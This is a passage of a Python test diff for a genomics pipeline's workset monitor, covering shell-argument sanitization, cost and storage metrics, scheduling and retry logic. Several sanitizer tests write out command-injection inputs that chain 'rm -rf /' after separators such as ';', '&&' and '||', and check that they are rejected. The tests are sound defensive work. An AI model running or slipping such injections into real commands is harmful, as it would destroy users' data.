+
+        workset = MagicMock(spec=Workset)
+        workset.name = "test-workset"
+        work_yaml = {}
+
+        result = monitor._format_clone_args("", workset, work_yaml)
+        assert result == ""
+
+    # -------------------------------------------------------------------
+    # Edge cases and comprehensive attack patterns
+    # -------------------------------------------------------------------
+
+    def test_sanitize_rejects_null_byte_injection(self, monitor):
+        """Test that null byte injection patterns are handled."""
+        # Null bytes in the middle of args - shlex should handle this
+        # but if it contains a dangerous pattern, we reject first
+        from daylib.workset_monitor import MonitorError
+
+        # Combine null with semicolon
+        with pytest.raises(MonitorError):
+            monitor._sanitize_shell_args("wgs\x00; rm -rf /", "test")
+
+    def test_sanitize_rejects_double_ampersand(self, monitor):
+        """Test that && (logical AND) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError):
+            monitor._sanitize_shell_args("wgs && rm -rf /", "test")
+
+    def test_sanitize_rejects_double_pipe(self, monitor):
+        """Test that || (logical OR) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError):
+            monitor._sanitize_shell_args("wgs || rm -rf /", "test")
+
+    def test_sanitize_allows_hyphens_and_underscores(self, monitor):
+        """Test that common safe characters are allowed."""
+        result = monitor._sanitize_shell_args("--my-flag --another_flag value-1", "test")
+        assert "--my-flag" in result
+        assert "--another_flag" in result
+        assert "value-1" in result
+
+    def test_sanitize_allows_dots_in_filenames(self, monitor):
+        """Test that dots in filenames are allowed."""
+        result = monitor._sanitize_shell_args("--input file.tsv --output result.csv", "test")
+        assert "file.tsv" in result
+        assert "result.csv" in result
+
+    def test_sanitize_allows_forward_slashes_in_paths(self, monitor):
+        """Test that forward slashes in paths are allowed."""
+        result = monitor._sanitize_shell_args("--path /fsx/analysis/samples.tsv", "test")
+        assert "/fsx/analysis/samples.tsv" in result
+
+    def test_sanitize_properly_quotes_spaces(self, monitor):
+        """Test that values with spaces are properly quoted."""
+        result = monitor._sanitize_shell_args('-d "workset with spaces"', "test")
+        # The result should have the value quoted to preserve the space
+        assert "workset with spaces" in result
+
+    def test_sanitize_context_appears_in_error_message(self, monitor):
+        """Test that the context string appears in error messages."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("bad; command", "my custom context")
+        assert "my custom context" in str(exc_info.value)
+
+
+class TestCostReportIntegration:
+    """Tests for Phase 5B: Cost report integration in workset monitor."""
+
+    @pytest.fixture
+    def monitor_with_state_db(self, tmp_path):
+        """Create a WorksetMonitor with mocked state_db."""
+        from unittest.mock import MagicMock, patch
+        from daylib.workset_monitor import WorksetMonitor
+
+        mock_config = MagicMock()
+        mock_config.aws.region = "us-west-2"
+        mock_config.aws.profile = None
+        mock_config.monitor.sentinel_index_bucket = "test-bucket"
+        mock_config.monitor.sentinel_prefix = "worksets/"
+        mock_config.monitor.local_state_root = str(tmp_path)
+        mock_config.pipeline.ssh_identity_file = "/path/to/key.pem"
+        mock_config.pipeline.ssh_user = "ubuntu"
+        mock_config.pipeline.ssh_extra_args = []
+
+        mock_state_db = MagicMock()
+        mock_state_db.update_cost_report.return_value = True
+        mock_state_db.update_storage_metrics.return_value = True
+        mock_state_db.update_performance_metrics.return_value = True
+
+        with patch("daylib.workset_monitor.boto3.client"):
+            monitor = WorksetMonitor(config=mock_config)
+            monitor.state_db = mock_state_db
+            yield monitor, mock_state_db
+
+    def test_collect_post_export_metrics_stores_cost_report(self, monitor_with_state_db):
+        """Test that _collect_post_export_metrics stores cost report in DynamoDB."""
+        from unittest.mock import MagicMock, patch
+
+        monitor, mock_state_db = monitor_with_state_db
+
+        # Create mock workset
+        mock_workset = MagicMock()
+        mock_workset.name = "test-ws-cost"
+
+        # Mock the PipelineStatusFetcher to return cost data
+        mock_perf_metrics = {
+            "alignment_stats": [{"sample": "HG002", "mapped_reads": 1000000}],
+            "benchmark_data": [{"rule": "bwa_mem2", "task_cost": "5.0"}],
+            "cost_summary": {
+                "total_cost": 12.5,
+                "per_sample_costs": {"HG002": 12.5},
+                "rule_count": 10,
+                "sample_count": 1,
+            },
+        }
+
+        with patch.object(monitor, "_get_s3_directory_size", return_value=1073741824):
+            with patch.object(monitor, "_collect_s3_file_metrics"):
+                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                    mock_fetcher = MagicMock()
+                    mock_fetcher.fetch_performance_metrics_from_s3.return_value = mock_perf_metrics
+                    mock_fetcher_class.return_value = mock_fetcher
+
+                    monitor._collect_post_export_metrics(
+                        mock_workset,
+                        "s3://test-bucket/worksets/test-ws-cost/",
+                    )
+
+        # Verify update_cost_report was called with correct arguments
+        mock_state_db.update_cost_report.assert_called_once()
+        call_kwargs = mock_state_db.update_cost_report.call_args.kwargs
+        assert call_kwargs["workset_id"] == "test-ws-cost"
+        assert call_kwargs["total_compute_cost_usd"] == 12.5
+        assert call_kwargs["per_sample_costs"] == {"HG002": 12.5}
+        assert call_kwargs["rule_count"] == 10
+        assert call_kwargs["sample_count"] == 1
+
+    def test_collect_post_export_metrics_handles_missing_cost_data(self, monitor_with_state_db):
+        """Test that _collect_post_export_metrics handles missing cost data gracefully."""
+        from unittest.mock import MagicMock, patch
+
+        monitor, mock_state_db = monitor_with_state_db
+
+        mock_workset = MagicMock()
+        mock_workset.name = "test-ws-no-cost"
+
+        # Mock fetcher to return no cost data
+        mock_perf_metrics = {
+            "alignment_stats": None,
+            "benchmark_data": None,
+            "cost_summary": None,
+        }
+
+        with patch.object(monitor, "_get_s3_directory_size", return_value=1000):
+            with patch.object(monitor, "_collect_s3_file_metrics"):
+                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                    mock_fetcher = MagicMock()
+                    mock_fetcher.fetch_performance_metrics_from_s3.return_value = mock_perf_metrics
+                    mock_fetcher_class.return_value = mock_fetcher
+
+                    monitor._collect_post_export_metrics(
+                        mock_workset,
+                        "s3://test-bucket/worksets/test-ws-no-cost/",
+                    )
+
+        # update_cost_report should NOT be called when no cost data
+        mock_state_db.update_cost_report.assert_not_called()
+
+
+class TestStorageMetricsIntegration:
+    """Tests for Phase 5C: Storage metrics integration in workset monitor."""
+
+    @pytest.fixture
+    def monitor_with_state_db(self, tmp_path):
+        """Create a WorksetMonitor with mocked state_db."""
+        from unittest.mock import MagicMock, patch
+        from daylib.workset_monitor import WorksetMonitor
+
+        mock_config = MagicMock()
+        mock_config.aws.region = "us-west-2"
+        mock_config.aws.profile = None
+        mock_config.monitor.sentinel_index_bucket = "test-bucket"
+        mock_config.monitor.sentinel_prefix = "worksets/"
+        mock_config.monitor.local_state_root = str(tmp_path)
+        mock_config.pipeline.ssh_identity_file = "/path/to/key.pem"
+        mock_config.pipeline.ssh_user = "ubuntu"
+        mock_config.pipeline.ssh_extra_args = []
+
+        mock_state_db = MagicMock()
+        mock_state_db.update_cost_report.return_value = True
+        mock_state_db.update_storage_metrics.return_value = True
+        mock_state_db.update_performance_metrics.return_value = True
+
+        with patch("daylib.workset_monitor.boto3.client"):
+            monitor = WorksetMonitor(config=mock_config)
+            monitor.state_db = mock_state_db
+            yield monitor, mock_state_db
+
+    def test_collect_post_export_metrics_stores_storage_metrics(self, monitor_with_state_db):
+        """Test that _collect_post_export_metrics stores storage metrics in DynamoDB."""
+        from unittest.mock import MagicMock, patch
+
+        monitor, mock_state_db = monitor_with_state_db
+
+        mock_workset = MagicMock()
+        mock_workset.name = "test-ws-storage"
+
+        # Mock S3 directory size
+        storage_bytes = 2147483648  # 2 GB
+
+        with patch.object(monitor, "_get_s3_directory_size", return_value=storage_bytes):
+            with patch.object(monitor, "_collect_s3_file_metrics"):
+                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                    mock_fetcher = MagicMock()
+                    mock_fetcher.fetch_performance_metrics_from_s3.return_value = {}
+                    mock_fetcher_class.return_value = mock_fetcher
+
+                    monitor._collect_post_export_metrics(
+                        mock_workset,
+                        "s3://test-bucket/worksets/test-ws-storage/",
+                    )
+
+        # Verify update_storage_metrics was called with correct arguments
+        mock_state_db.update_storage_metrics.assert_called_once()
+        call_kwargs = mock_state_db.update_storage_metrics.call_args.kwargs
+        assert call_kwargs["workset_id"] == "test-ws-storage"
+        assert call_kwargs["results_storage_bytes"] == storage_bytes
+        assert call_kwargs["fsx_storage_bytes"] is None
+
+    def test_collect_post_export_metrics_skips_storage_when_zero(self, monitor_with_state_db):
+        """Test that _collect_post_export_metrics skips storage metrics when size is 0."""
+        from unittest.mock import MagicMock, patch
+
+        monitor, mock_state_db = monitor_with_state_db
+
+        mock_workset = MagicMock()
+        mock_workset.name = "test-ws-zero-storage"
+
+        with patch.object(monitor, "_get_s3_directory_size", return_value=0):
+            with patch.object(monitor, "_collect_s3_file_metrics"):
+                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                    mock_fetcher = MagicMock()
+                    mock_fetcher.fetch_performance_metrics_from_s3.return_value = {}
+                    mock_fetcher_class.return_value = mock_fetcher
+
+                    monitor._collect_post_export_metrics(
+                        mock_workset,
+                        "s3://test-bucket/worksets/test-ws-zero-storage/",
+                    )
+
+        # update_storage_metrics should NOT be called when size is 0
+        mock_state_db.update_storage_metrics.assert_not_called()
+
+    def test_collect_post_export_metrics_handles_storage_error(self, monitor_with_state_db):
+        """Test that _collect_post_export_metrics handles storage update errors gracefully."""
+        from unittest.mock import MagicMock, patch
+
+        monitor, mock_state_db = monitor_with_state_db
+        mock_state_db.update_storage_metrics.side_effect = Exception("DynamoDB error")
+
+        mock_workset = MagicMock()
+        mock_workset.name = "test-ws-storage-error"
+
+        with patch.object(monitor, "_get_s3_directory_size", return_value=1000):
+            with patch.object(monitor, "_collect_s3_file_metrics"):
+                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                    mock_fetcher = MagicMock()
+                    mock_fetcher.fetch_performance_metrics_from_s3.return_value = {}
+                    mock_fetcher_class.return_value = mock_fetcher
+
+                    # Should not raise - errors are logged but not propagated
+                    result = monitor._collect_post_export_metrics(
+                        mock_workset,
+                        "s3://test-bucket/worksets/test-ws-storage-error/",
+                    )
+
+        # Method should complete despite error
+        assert result is not None or result is None  # Just verify no exception
+
+    def test_collect_post_export_metrics_stores_both_cost_and_storage(self, monitor_with_state_db):
+        """Test that _collect_post_export_metrics stores both cost and storage metrics."""
+        from unittest.mock import MagicMock, patch
+
+        monitor, mock_state_db = monitor_with_state_db
+
+        mock_workset = MagicMock()
+        mock_workset.name = "test-ws-both"
+
+        storage_bytes = 5368709120  # 5 GB
+        mock_perf_metrics = {
+            "cost_summary": {
+                "total_cost": 25.0,
+                "per_sample_costs": {"HG002": 15.0, "HG003": 10.0},
+                "rule_count": 20,
+                "sample_count": 2,
+            },
+        }
+
+        with patch.object(monitor, "_get_s3_directory_size", return_value=storage_bytes):
+            with patch.object(monitor, "_collect_s3_file_metrics"):
+                with patch("daylib.pipeline_status.PipelineStatusFetcher") as mock_fetcher_class:
+                    mock_fetcher = MagicMock()
+                    mock_fetcher.fetch_performance_metrics_from_s3.return_value = mock_perf_metrics
+                    mock_fetcher_class.return_value = mock_fetcher
+
+                    monitor._collect_post_export_metrics(
+                        mock_workset,
+                        "s3://test-bucket/worksets/test-ws-both/",
+                    )
+
+        # Both should be called
+        mock_state_db.update_cost_report.assert_called_once()
+        mock_state_db.update_storage_metrics.assert_called_once()
+
+        # Verify cost report
+        cost_kwargs = mock_state_db.update_cost_report.call_args.kwargs
+        assert cost_kwargs["total_compute_cost_usd"] == 25.0
+        assert cost_kwargs["sample_count"] == 2
+
+        # Verify storage metrics
+        storage_kwargs = mock_state_db.update_storage_metrics.call_args.kwargs
+        assert storage_kwargs["results_storage_bytes"] == storage_bytes
+
+
+# ==============================================================================
+# Phase 6A: Scheduler Integration Tests
+# ==============================================================================
+
+
+class TestSchedulerIntegration:
+    """Tests for WorksetMonitor scheduler integration."""
+
+    @pytest.fixture
+    def mock_config(self, tmp_path):
+        """Create mock MonitorConfig for scheduler tests."""
+        config = MagicMock()
+        config.aws.region = "us-west-2"
+        config.aws.profile = None
+        config.aws.session_duration_seconds = None
+        config.monitor.prefix = "worksets/"
+        config.monitor.normalised_prefix.return_value = "worksets/"
+        config.monitor.sentinel_index_bucket = "test-bucket"
+        config.monitor.sentinel_index_prefix = "worksets/"
+        config.monitor.local_state_root = str(tmp_path)
+        config.monitor.poll_interval_seconds = 60
+        config.monitor.max_concurrent_worksets = 3
+        config.monitor.continuous = True
+        config.monitor.ready_lock_backoff_seconds = 30
+        config.pipeline.ssh_identity_file = "/path/to/key.pem"
+        config.pipeline.ssh_user = "ubuntu"
+        config.pipeline.ssh_extra_args = []
+        config.pipeline.local_state_root = str(tmp_path)
+        config.cluster.reuse_cluster_name = None
+        config.cluster.auto_teardown = False
+        return config
+
+    @pytest.fixture
+    def mock_scheduler(self):
+        """Create mock WorksetScheduler."""
+        scheduler = MagicMock()
+        scheduler.register_cluster.return_value = None
+        scheduler.update_cluster_utilization.return_value = None
+        scheduler.get_next_workset.return_value = None
+        scheduler.schedule_workset.return_value = MagicMock(cluster_name="test-cluster")
+        return scheduler
+
+    @pytest.fixture
+    def monitor_with_scheduler(self, mock_config, mock_scheduler):
+        """Create monitor with scheduler."""
+        from daylib.workset_monitor import WorksetMonitor
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(
+                    mock_config,
+                    scheduler=mock_scheduler,
+                )
+                return monitor, mock_scheduler
+
+    def test_monitor_accepts_scheduler_parameter(self, mock_config):
+        """Test that WorksetMonitor accepts optional scheduler parameter."""
+        from daylib.workset_monitor import WorksetMonitor
+
+        mock_scheduler = MagicMock()
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(
+                    mock_config,
+                    scheduler=mock_scheduler,
+                )
+
+        assert monitor.scheduler == mock_scheduler
+
+    def test_monitor_without_scheduler(self, mock_config):
+        """Test that WorksetMonitor works without scheduler."""
+        from daylib.workset_monitor import WorksetMonitor
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(mock_config)
+
+        assert monitor.scheduler is None
+
+    def test_register_cluster_capacity_with_scheduler(self, monitor_with_scheduler):
+        """Test register_cluster_capacity calls scheduler.register_cluster."""
+        monitor, mock_scheduler = monitor_with_scheduler
+
+        monitor.register_cluster_capacity(
+            cluster_name="test-cluster-1",
+            availability_zone="us-west-2a",
+            max_vcpus=500,
+            max_memory_gb=2000.0,
+        )
+
+        mock_scheduler.register_cluster.assert_called_once()
+        call_args = mock_scheduler.register_cluster.call_args
+        capacity = call_args[0][0]
+        assert capacity.cluster_name == "test-cluster-1"
+        assert capacity.availability_zone == "us-west-2a"
+        assert capacity.max_vcpus == 500
+
+    def test_register_cluster_capacity_without_scheduler(self, mock_config):
+        """Test register_cluster_capacity is no-op without scheduler."""
+        from daylib.workset_monitor import WorksetMonitor
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(mock_config)
+
+        # Should not raise
+        monitor.register_cluster_capacity(
+            cluster_name="test-cluster",
+            availability_zone="us-west-2a",
+        )
+
+    def test_update_cluster_utilization_with_scheduler(self, monitor_with_scheduler):
+        """Test update_cluster_utilization calls scheduler."""
+        monitor, mock_scheduler = monitor_with_scheduler
+
+        monitor.update_cluster_utilization(
+            cluster_name="test-cluster-1",
+            vcpus_used=100,
+            memory_gb_used=500.0,
+            active_worksets=2,
+        )
+
+        mock_scheduler.update_cluster_utilization.assert_called_once_with(
+            cluster_name="test-cluster-1",
+            vcpus_used=100,
+            memory_gb_used=500.0,
+            active_worksets=2,
+        )
+
+    def test_update_cluster_utilization_auto_calculates_active(self, monitor_with_scheduler):
+        """Test update_cluster_utilization auto-calculates active worksets."""
+        monitor, mock_scheduler = monitor_with_scheduler
+
+        # Mark a workset as active
+        monitor._active_worksets.add("ws-1")
+
+        monitor.update_cluster_utilization(
+            cluster_name="test-cluster-1",
+            vcpus_used=50,
+        )
+
+        call_kwargs = mock_scheduler.update_cluster_utilization.call_args.kwargs
+        assert call_kwargs["active_worksets"] == 1
+
+    def test_get_prioritized_worksets_with_scheduler(self, monitor_with_scheduler):
+        """Test _get_prioritized_worksets uses scheduler ordering."""
+        from daylib.workset_monitor import Workset
+
+        monitor, mock_scheduler = monitor_with_scheduler
+
+        # Create worksets
+        worksets = [
+            Workset(name="ws-low", prefix="p1/", sentinels={}, bucket="b"),
+            Workset(name="ws-high", prefix="p2/", sentinels={}, bucket="b"),
+            Workset(name="ws-normal", prefix="p3/", sentinels={}, bucket="b"),
+        ]
+
+        # Scheduler returns in priority order
+        mock_scheduler.get_next_workset.side_effect = [
+            {"workset_id": "ws-high"},
+            {"workset_id": "ws-normal"},
+            {"workset_id": "ws-low"},
+            None,
+        ]
+
+        result = monitor._get_prioritized_worksets(worksets)
+
+        assert len(result) == 3
+        assert result[0].name == "ws-high"
+        assert result[1].name == "ws-normal"
+        assert result[2].name == "ws-low"
+
+    def test_get_prioritized_worksets_without_scheduler(self, mock_config):
+        """Test _get_prioritized_worksets preserves order without scheduler."""
+        from daylib.workset_monitor import WorksetMonitor, Workset
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(mock_config)
+
+        worksets = [
+            Workset(name="ws-1", prefix="p1/", sentinels={}, bucket="b"),
+            Workset(name="ws-2", prefix="p2/", sentinels={}, bucket="b"),
+        ]
+
+        result = monitor._get_prioritized_worksets(worksets)
+
+        assert result == worksets
+
+    def test_handle_workset_async_updates_scheduler_on_completion(self, mock_config):
+        """Test _handle_workset_async updates scheduler after workset completes."""
+        from daylib.workset_monitor import WorksetMonitor, Workset
+
+        mock_scheduler = MagicMock()
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(
+                    mock_config,
+                    scheduler=mock_scheduler,
+                )
+
+        workset = Workset(name="test-ws", prefix="p/", sentinels={}, bucket="b")
+
+        # Pre-populate metrics with cluster name
+        monitor._workset_metrics["test-ws"] = {"cluster_name": "cluster-1"}
+
+        # Mock _handle_workset to avoid actual processing
+        with patch.object(monitor, "_handle_workset"):
+            monitor._handle_workset_async(workset)
+
+        # Scheduler should be updated
+        mock_scheduler.update_cluster_utilization.assert_called_once()
+        call_kwargs = mock_scheduler.update_cluster_utilization.call_args.kwargs
+        assert call_kwargs["cluster_name"] == "cluster-1"
+
+
+# ==============================================================================
+# Phase 6B: Concurrent Processor Integration Tests
+# ==============================================================================
+
+
+class TestConcurrentProcessorIntegration:
+    """Tests for ConcurrentWorksetProcessor integration with WorksetMonitor."""
+
+    @pytest.fixture
+    def mock_config(self, tmp_path):
+        """Create mock MonitorConfig for concurrent processor tests."""
+        config = MagicMock()
+        config.aws.region = "us-west-2"
+        config.aws.profile = None
+        config.aws.session_duration_seconds = None
+        config.monitor.prefix = "worksets/"
+        config.monitor.normalised_prefix.return_value = "worksets/"
+        config.monitor.sentinel_index_bucket = "test-bucket"
+        config.monitor.sentinel_index_prefix = "worksets/"
+        config.monitor.local_state_root = str(tmp_path)
+        config.monitor.poll_interval_seconds = 60
+        config.monitor.max_concurrent_worksets = 3
+        config.monitor.continuous = True
+        config.monitor.ready_lock_backoff_seconds = 30
+        config.pipeline.ssh_identity_file = "/path/to/key.pem"
+        config.pipeline.ssh_user = "ubuntu"
+        config.pipeline.ssh_extra_args = []
+        config.pipeline.local_state_root = str(tmp_path)
+        config.cluster.reuse_cluster_name = None
+        config.cluster.auto_teardown = False
+        return config
+
+    @pytest.fixture
+    def monitor_with_all_components(self, mock_config):
+        """Create monitor with state_db and scheduler."""
+        from daylib.workset_monitor import WorksetMonitor
+
+        mock_state_db = MagicMock()
+        mock_scheduler = MagicMock()
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(
+                    mock_config,
+                    state_db=mock_state_db,
+                    scheduler=mock_scheduler,
+                )
+                return monitor, mock_state_db, mock_scheduler
+
+    def test_use_concurrent_processor_config_option(self):
+        """Test MonitorOptions has use_concurrent_processor flag."""
+        from daylib.workset_monitor import MonitorOptions
+
+        options = MonitorOptions(prefix="worksets/")
+        assert hasattr(options, "use_concurrent_processor")
+        assert options.use_concurrent_processor is False
+
+    def test_create_workset_executor_returns_callable(self, monitor_with_all_components):
+        """Test create_workset_executor returns a callable."""
+        monitor, _, _ = monitor_with_all_components
+
+        executor = monitor.create_workset_executor()
+
+        assert callable(executor)
+
+    def test_workset_executor_processes_workset_dict(self, monitor_with_all_components):
+        """Test executor processes workset dict and calls _handle_workset."""
+        monitor, _, _ = monitor_with_all_components
+
+        executor = monitor.create_workset_executor()
+
+        workset_data = {
+            "workset_id": "test-ws-exec",
+            "bucket": "test-bucket",
+            "prefix": "worksets/test-ws-exec/",
+            "state": "ready",
+        }
+        decision = MagicMock(cluster_name="test-cluster")
+
+        # Mock _handle_workset
+        with patch.object(monitor, "_handle_workset") as mock_handle:
+            with patch.object(monitor, "_verify_core_files", return_value=True):
+                result = executor(workset_data, decision)
+
+        assert result is True
+        mock_handle.assert_called_once()
+        # Verify the Workset object was constructed correctly
+        ws_arg = mock_handle.call_args[0][0]
+        assert ws_arg.name == "test-ws-exec"
+        assert ws_arg.bucket == "test-bucket"
+
+    def test_workset_executor_handles_missing_workset_id(self, monitor_with_all_components):
+        """Test executor returns False for missing workset_id."""
+        monitor, _, _ = monitor_with_all_components
+
+        executor = monitor.create_workset_executor()
+
+        workset_data = {
+            "bucket": "test-bucket",
+            # Missing workset_id
+        }
+        decision = MagicMock()
+
+        result = executor(workset_data, decision)
+
+        assert result is False
+
+    def test_workset_executor_handles_processing_error(self, monitor_with_all_components):
+        """Test executor returns False when processing raises exception."""
+        monitor, _, _ = monitor_with_all_components
+
+        executor = monitor.create_workset_executor()
+
+        workset_data = {
+            "workset_id": "test-ws-error",
+            "bucket": "test-bucket",
+            "prefix": "worksets/test-ws-error/",
+        }
+        decision = MagicMock()
+
+        # Mock _handle_workset to raise
+        with patch.object(monitor, "_handle_workset", side_effect=Exception("Test error")):
+            with patch.object(monitor, "_verify_core_files", return_value=True):
+                result = executor(workset_data, decision)
+
+        assert result is False
+
+    def test_run_with_concurrent_processor_requires_scheduler(self, mock_config):
+        """Test run_with_concurrent_processor raises without scheduler."""
+        from daylib.workset_monitor import WorksetMonitor, MonitorError
+
+        mock_state_db = MagicMock()
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(
+                    mock_config,
+                    state_db=mock_state_db,
+                    scheduler=None,
+                )
+
+        with pytest.raises(MonitorError, match="Scheduler is required"):
+            monitor.run_with_concurrent_processor()
+
+    def test_run_with_concurrent_processor_requires_state_db(self, mock_config):
+        """Test run_with_concurrent_processor raises without state_db."""
+        from daylib.workset_monitor import WorksetMonitor, MonitorError
+
+        mock_scheduler = MagicMock()
+
+        with patch("daylib.workset_monitor.boto3"):
+            with patch("daylib.workset_monitor.RegionAwareS3Client"):
+                monitor = WorksetMonitor(
+                    mock_config,
+                    state_db=None,
+                    scheduler=mock_scheduler,
+                )
+
+        with pytest.raises(MonitorError, match="DynamoDB state_db is required"):
+            monitor.run_with_concurrent_processor()
+
+    def test_run_with_concurrent_processor_creates_processor(self, monitor_with_all_components):
+        """Test run_with_concurrent_processor creates and starts processor."""
+        monitor, mock_state_db, mock_scheduler = monitor_with_all_components
+
+        with patch("daylib.workset_concurrent_processor.ConcurrentWorksetProcessor") as mock_processor_class:
+            mock_processor = MagicMock()
+            # Make start() raise to exit immediately
+            mock_processor.start.side_effect = KeyboardInterrupt()
+            mock_processor_class.return_value = mock_processor
+
+            with patch.object(monitor, "_register_discovered_clusters"):
+                monitor.run_with_concurrent_processor()
+
+            # Verify processor was created with correct args
+            mock_processor_class.assert_called_once()
+            call_kwargs = mock_processor_class.call_args.kwargs
+            assert call_kwargs["state_db"] == mock_state_db
+            assert call_kwargs["scheduler"] == mock_scheduler
+            assert callable(call_kwargs["workset_executor"])
+
+            # Verify processor was started and stopped
+            mock_processor.start.assert_called_once()
+            mock_processor.stop.assert_called_once()
+
+    def test_concurrent_processor_config_from_monitor_config(self, monitor_with_all_components):
+        """Test ConcurrentWorksetProcessor config matches monitor config."""
+        monitor, _, _ = monitor_with_all_components
+
+        with patch("daylib.workset_concurrent_processor.ConcurrentWorksetProcessor") as mock_processor_class:
+            mock_processor = MagicMock()
+            mock_processor.start.side_effect = KeyboardInterrupt()
+            mock_processor_class.return_value = mock_processor
+
+            with patch.object(monitor, "_register_discovered_clusters"):
+                monitor.run_with_concurrent_processor()
+
+            call_kwargs = mock_processor_class.call_args.kwargs
+            config = call_kwargs["config"]
+
+            # Verify config values match monitor config
+            assert config.max_concurrent_worksets == monitor.config.monitor.max_concurrent_worksets
+            assert config.poll_interval_seconds == monitor.config.monitor.poll_interval_seconds
+
+
+# ==============================================================================
+# Phase 7: Workset Retry Semantics Tests
+# ==============================================================================
+
+
+class TestWorksetRetrySemantics:
+    """Tests for workset retry semantics (Task 23).
+
+    Verifies that retry creates a new workset cloned from the original,
+    with new datetime suffix, leaving the original unchanged.
+    """
+
+    def test_retry_creates_new_workset_with_new_id(self):
+        """Test that retry creates a new workset, not modifying the original."""
+        import re
+
+        # Original workset ID format: {safe-name}-{uuid8}-{YYYYMMDD}
+        original_id = "my-analysis-abc12345-20250120"
+
+        # Extract base name from original
+        match = re.match(r"^(.+)-[a-f0-9]{8}-\d{8}$", original_id)
+        assert match is not None, "Original ID should match pattern"
+        base_name = match.group(1)
+        assert base_name == "my-analysis"
+
+    def test_retry_clones_metadata_from_original(self):
+        """Test that retried workset preserves configuration from original."""
+        original_metadata = {
+            "workset_name": "My Analysis",
+            "samples": [{"sample_id": "S001"}, {"sample_id": "S002"}],
+            "sample_count": 2,
+            "archive_results": True,
+            "data_bucket": "customer-bucket",
+            "preferred_cluster": "cluster-us-west-2",
+            "pipeline_type": "wgs",
+        }
+
+        # Simulate cloning metadata for retry
+        new_metadata = {
+            "workset_name": original_metadata.get("workset_name"),
+            "samples": original_metadata.get("samples", []),
+            "sample_count": original_metadata.get("sample_count", 0),
+            "archive_results": original_metadata.get("archive_results", True),
+            "data_bucket": original_metadata.get("data_bucket"),
+            "preferred_cluster": original_metadata.get("preferred_cluster"),
+            "retried_from": "original-workset-id",
+        }
+
+        # Verify key fields were preserved
+        assert new_metadata["workset_name"] == "My Analysis"
+        assert new_metadata["samples"] == [{"sample_id": "S001"}, {"sample_id": "S002"}]
+        assert new_metadata["sample_count"] == 2
+        assert new_metadata["archive_results"] is True
+        assert new_metadata["retried_from"] == "original-workset-id"
+
+    def test_retry_adds_cross_references(self):
+        """Test that retry adds tracking metadata to both worksets."""
+        original_workset_id = "original-ws-abc12345-20250120"
+        new_workset_id = "original-ws-def67890-20250125"
+
+        # New workset should have "retried_from"
+        new_metadata = {"retried_from": original_workset_id}
+        assert new_metadata["retried_from"] == original_workset_id
+
+        # Original should be updated with "retried_as"
+        original_update = {"retried_as": new_workset_id}
+        assert original_update["retried_as"] == new_workset_id
+
+    def test_retry_preserves_original_workset_state(self):
+        """Test that original workset state is not modified during retry."""
+        # Simulate original workset in error state
+        original = {
+            "workset_id": "failed-ws-abc12345-20250120",
+            "state": "error",
+            "error_details": "Pipeline failed",
+            "customer_id": "customer-x",
+            "metadata": {"samples": []},
+        }
+
+        # After retry, original should remain in error state
+        # (retry creates a new workset, doesn't modify original)
+        assert original["state"] == "error"
+        assert original["error_details"] == "Pipeline failed"
+
+    def test_new_workset_id_has_different_datetime_suffix(self):
+        """Test that new workset ID has different datetime suffix."""
+        import re
+        import uuid
+        import datetime as dt
+
+        original_id = "my-analysis-abc12345-20250120"
+
+        # Extract base name
+        match = re.match(r"^(.+)-[a-f0-9]{8}-\d{8}$", original_id)
+        base_name = match.group(1)
+
+        # Generate new ID (simulating what the API does)
+        date_suffix = dt.datetime.now(dt.timezone.utc).strftime("%Y%m%d")
+        new_id = f"{base_name}-{uuid.uuid4().hex[:8]}-{date_suffix}"
+
+        # New ID should have same base name but different uuid and possibly different date
+        new_match = re.match(r"^(.+)-([a-f0-9]{8})-(\d{8})$", new_id)
+        assert new_match is not None
+        assert new_match.group(1) == base_name
+
+        # The uuid part should be different
+        original_uuid = "abc12345"
+        new_uuid = new_match.group(2)
+        assert new_uuid != original_uuid
+
+    def test_update_metadata_method_merges_fields(self):
+        """Test that update_metadata properly merges with existing metadata."""
+        from unittest.mock import MagicMock, patch
+
+        mock_table = MagicMock()
+
+        with patch("daylib.workset_state_db.boto3.Session"):
+            from daylib.workset_state_db import WorksetStateDB
+
+            state_db = WorksetStateDB.__new__(WorksetStateDB)
+            state_db.table = mock_table
+            state_db._cloudwatch = None
+
+            # Mock get_workset to return existing workset
+            state_db.get_workset = MagicMock(return_value={
+                "workset_id": "test-ws",
+                "metadata": {
+                    "samples": [{"sample_id": "S1"}],
+                    "existing_field": "value",
+                },
+            })
+
+            # Update metadata
+            result = state_db.update_metadata("test-ws", {"retried_as": "new-ws-id"})
+
+            assert result is True
+            mock_table.update_item.assert_called_once()
+
+            # Verify the merged metadata includes both old and new fields
+            call_kwargs = mock_table.update_item.call_args.kwargs
+            assert ":meta" in call_kwargs["ExpressionAttributeValues"]
+
+    def test_retry_endpoint_ownership_check(self):
